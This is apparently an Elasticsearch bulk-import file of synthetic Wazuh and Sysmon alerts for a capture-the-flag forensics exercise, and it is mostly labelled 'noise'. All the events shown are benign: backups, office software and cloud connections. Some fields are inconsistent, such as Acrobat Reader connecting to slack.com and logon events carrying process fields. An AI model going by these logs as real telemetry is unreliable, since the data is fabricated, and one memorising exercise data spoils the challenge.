{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0173-6657"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T19:32:08.521460Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe", "parentProcessName": "C:\\Windows\\System32\\services.exe", "commandLine": "VeeamAgent.exe /job:NightlyBackup", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0x1bc90"}}}, "timestamp": "2025-10-08T19:32:08.521460Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0081-5231"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T11:01:31.841881Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{592d9e8b-ff51-4bda-bc90-6e81a05f457b}", "ProcessId": "1186", "Image": "C:\\Windows\\System32\\taskhostw.exe", "User": "CORP\\mreyes", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "60049", "DestinationIp": "52.112.194.132", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "teams.microsoft.com"}}}, "timestamp": "2025-10-08T11:01:31.841881Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0037-3274"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T12:50:27.612145Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{c0d947a9-1733-45ac-abbb-b84112de081e}", "ProcessId": "7743", "Image": "C:\\Windows\\System32\\SearchIndexer.exe", "CommandLine": "SearchIndexer.exe", "ParentProcessId": "2562", "ParentImage": "C:\\Windows\\System32\\services.exe", "Hashes": "SHA256=f7686a8d6caf43f2aff23e483e6d3040cc6c83a75fb240bbababc09bba0a153d", "User": "CORP\\jsmith"}}}, "timestamp": "2025-10-08T12:50:27.612145Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0142-4832"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T19:55:49.571900Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0xca6d8"}}}, "timestamp": "2025-10-08T19:55:49.571900Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "2525a4f3-36ea-488b-a99e-253400208293"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T18:14:48.453131Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\robocopy.exe", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "commandLine": "robocopy.exe \"D:\\Shares\\Public\" \"D:\\Backups\\Public\" /MIR", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0x73de8"}}}, "timestamp": "2025-10-08T18:14:48.453131Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "ec8f3a07-8c76-4196-a5a7-b47d710a74d2"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T11:02:44.115002Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{21f68232-c67d-4c05-bc5a-578d95b14338}", "ProcessId": "2746", "Image": "C:\\Windows\\System32\\conhost.exe", "User": "NT AUTHORITY\\SYSTEM", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "50597", "DestinationIp": "52.96.166.2", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "outlook.office365.com"}}}, "timestamp": "2025-10-08T11:02:44.115002Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "8b5cc88b-2089-40e5-83db-5d04945ba7ef"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T18:58:15.204585Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "commandLine": "AcroRd32.exe", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0xb6463"}}}, "timestamp": "2025-10-08T18:58:15.204585Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "25401195-d158-4460-9534-c4e157a6c7c7"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T18:26:26.429571Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{87fa8790-4718-49ab-8ff8-b44d19070ac1}", "ProcessId": "6542", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "50308", "DestinationIp": "10.10.5.60", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "backup-vault.corp.local"}}}, "timestamp": "2025-10-08T18:26:26.429571Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0075-2702"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T09:05:27.335963Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{db82ce71-56ff-4f93-bccf-7fe3a90b9cb7}", "ProcessId": "2289", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessId": "6225", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=910d90c0979a48b58bcf50f9b8758bc0b2fdb7543a5546a29fad95b2bf82f33b", "User": "CORP\\svc-backup"}}}, "timestamp": "2025-10-08T09:05:27.335963Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "4eae1a39-5355-4742-8934-12a8f8a90ec9"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T08:16:09.327472Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{8c409539-13f8-4f39-ac65-d8881e7576f9}", "ProcessId": "2592", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "User": "NT AUTHORITY\\SYSTEM", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "49489", "DestinationIp": "10.10.5.9", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "self-service.corp.local"}}}, "timestamp": "2025-10-08T08:16:09.327472Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "64d5a4c7-a26c-4326-a8b2-d60dd2ae71ff"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T08:31:58.754320Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{7db0b0af-269f-46f8-8a03-1bd486ee8432}", "ProcessId": "5351", "Image": "C:\\Program Files\\Zoom\\bin\\Zoom.exe", "CommandLine": "Zoom.exe", "ParentProcessId": "2639", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=19bfaa27aaf84ae880a2f5e63e2667f6f4b6a2a1e8c64c969e3dd8edc2738433", "User": "NT AUTHORITY\\SYSTEM"}}}, "timestamp": "2025-10-08T08:31:58.754320Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0088-6135"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T11:14:22.864063Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{3f8d29ae-d2c7-42b9-9e96-e7c3b6e74b34}", "ProcessId": "1049", "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe", "User": "CORP\\jsmith", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "64265", "DestinationIp": "3.233.20.11", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "slack.com"}}}, "timestamp": "2025-10-08T11:14:22.864063Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0065-6178"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T10:50:13.314507Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{3bbcfd5e-a297-497d-9f3b-252175ef2788}", "ProcessId": "4269", "Image": "C:\\Windows\\System32\\taskhostw.exe", "CommandLine": "taskhostw.exe", "ParentProcessId": "6572", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "Hashes": "SHA256=b3f3bf3ddeaa489ba5de96f158af72c92b56f1052e82442894a9b930cd21fe18", "User": "CORP\\svc-backup"}}}, "timestamp": "2025-10-08T10:50:13.314507Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0126-3635"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A logon was successful.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4624", "systemTime": "2025-10-08T18:41:11.705934Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\cmd.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0x48f79"}}}, "timestamp": "2025-10-08T18:41:11.705934Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0217-6494"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T19:53:51.485991Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{805368ed-79c6-4530-ae8c-c9013b123325}", "ProcessId": "4640", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "49554", "DestinationIp": "10.10.5.20", "DestinationPort": "9100", "Initiated": "true"}}}, "timestamp": "2025-10-08T19:53:51.485991Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0162-9647"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T19:52:15.428043Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\taskmgr.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "commandLine": "taskmgr.exe", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0xe572c"}}}, "timestamp": "2025-10-08T19:52:15.428043Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0225-8313"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T19:19:31.578229Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{e637773f-de7b-4297-b76b-6618a1e7ad46}", "ProcessId": "8920", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "58270", "DestinationIp": "10.10.5.15", "DestinationPort": "80", "Initiated": "true", "DestinationHostname": "intranet.corp.local"}}}, "timestamp": "2025-10-08T19:19:31.578229Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "66df531b-6d57-4494-99b6-0a068e8b6b34"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T09:14:56.484253Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{f8a6d99f-649a-4a48-9461-4491d91acd20}", "ProcessId": "6683", "Image": "C:\\Program Files (x86)\\Microsoft\\Teams\\current\\Teams.exe", "User": "NT AUTHORITY\\SYSTEM", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "51558", "DestinationIp": "3.233.20.11", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "slack.com"}}}, "timestamp": "2025-10-08T09:14:56.484253Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0073-5372"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T11:18:08.571913Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{6a609618-037b-4765-abb8-31017b03161d}", "ProcessId": "9607", "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe", "CommandLine": "AcroRd32.exe", "ParentProcessId": "9590", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=9a2029ce8339467f86df5c15e09e69b118564cf46d204c379152169c94d9fedd", "User": "CORP\\svc-backup"}}}, "timestamp": "2025-10-08T11:18:08.571913Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0230-2120"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T18:56:45.140151Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{bcc7b2ca-110c-434f-946b-f7508e9a3255}", "ProcessId": "2927", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "53392", "DestinationIp": "13.107.4.50", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "update.microsoft.com"}}}, "timestamp": "2025-10-08T18:56:45.140151Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0016-9262"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T11:33:52.623057Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{5f6e3e86-87c2-4e71-9c06-3492792c7243}", "ProcessId": "7369", "Image": "C:\\Windows\\System32\\WmiPrvSE.exe", "CommandLine": "WmiPrvSE.exe", "ParentProcessId": "3286", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "Hashes": "SHA256=2c4298fae03d41fcb07f754f958de0667cdebc28ed1542cc9d914c7cb26b5333", "User": "CORP\\jsmith"}}}, "timestamp": "2025-10-08T11:33:52.623057Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "719a8201-9d49-4c3d-ba52-4912fcb0e10a"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T09:52:20.244534Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{8143b877-166c-4de3-8634-07f6e86d620f}", "ProcessId": "6605", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessId": "1492", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=712571e937ed4d99808ed369378307eebfdad9bb92d24b619531a32a3c4f094e", "User": "NT AUTHORITY\\SYSTEM"}}}, "timestamp": "2025-10-08T09:52:20.244534Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "47dd891c-370e-44db-bd13-1777cb06a1a9"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T10:05:54.155417Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{e5d319e9-5d73-40bf-9c41-3d4fbf3d7b36}", "ProcessId": "5922", "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe", "CommandLine": "backgroundTaskHost.exe", "ParentProcessId": "3347", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "Hashes": "SHA256=361e080615b3404e9221412a18338b2d416b410d27d84827be2db3987a59c3c7", "User": "NT AUTHORITY\\SYSTEM"}}}, "timestamp": "2025-10-08T10:05:54.155417Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0041-8187"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T10:58:31.892733Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{fefaa143-ffc7-42d7-a7da-ab717d9a81b3}", "ProcessId": "8489", "Image": "C:\\Program Files\\7-Zip\\7zFM.exe", "CommandLine": "7zFM.exe", "ParentProcessId": "3115", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=8eb83ef8bf324e36981aa9533b66fbf4c353ca64e76940da8184136e7e544dcd", "User": "NT AUTHORITY\\SYSTEM"}}}, "timestamp": "2025-10-08T10:58:31.892733Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0102-9192"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T10:38:43.404832Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{f282c89d-6ad3-461c-86f0-9b08427468d8}", "ProcessId": "9893", "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "User": "CORP\\mreyes", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "61208", "DestinationIp": "10.10.5.2", "DestinationPort": "53", "Initiated": "true"}}}, "timestamp": "2025-10-08T10:38:43.404832Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0135-2257"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A logon was successful.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4624", "systemTime": "2025-10-08T18:17:51.965291Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\notepad.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0x7951c"}}}, "timestamp": "2025-10-08T18:17:51.965291Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "6e9062ac-fbd8-4b61-9f11-947824426c56"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T11:20:51.317407Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{46cbec18-5697-46d4-b86c-9e44c242d376}", "ProcessId": "4624", "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe", "CommandLine": "MsMpEng.exe", "ParentProcessId": "3091", "ParentImage": "C:\\Windows\\System32\\services.exe", "Hashes": "SHA256=3c30085acae649a5be60c95e96d680ad1aa2aab39adc4460a4adbca9aa52c715", "User": "NT AUTHORITY\\SYSTEM"}}}, "timestamp": "2025-10-08T11:20:51.317407Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0209-4050"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T18:48:16.583251Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{dd26ef49-33a0-4862-8f65-cd55d59a0293}", "ProcessId": "8432", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "61711", "DestinationIp": "10.10.5.20", "DestinationPort": "9100", "Initiated": "true"}}}, "timestamp": "2025-10-08T18:48:16.583251Z", "location": "Sysmon"}
